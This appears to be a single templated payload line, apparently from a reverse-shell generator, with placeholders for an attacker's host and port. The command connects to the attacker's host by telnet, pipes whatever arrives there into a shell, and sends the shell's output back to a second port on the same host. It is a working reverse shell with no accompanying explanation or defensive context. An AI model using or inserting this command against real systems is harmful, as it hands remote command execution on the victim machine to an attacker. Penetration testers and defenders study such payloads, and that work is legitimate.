telnet {{ LHOST }} {{ LPORT }} | sh | telnet {{ LHOST }} $(( {{ LPORT+1 }} ))
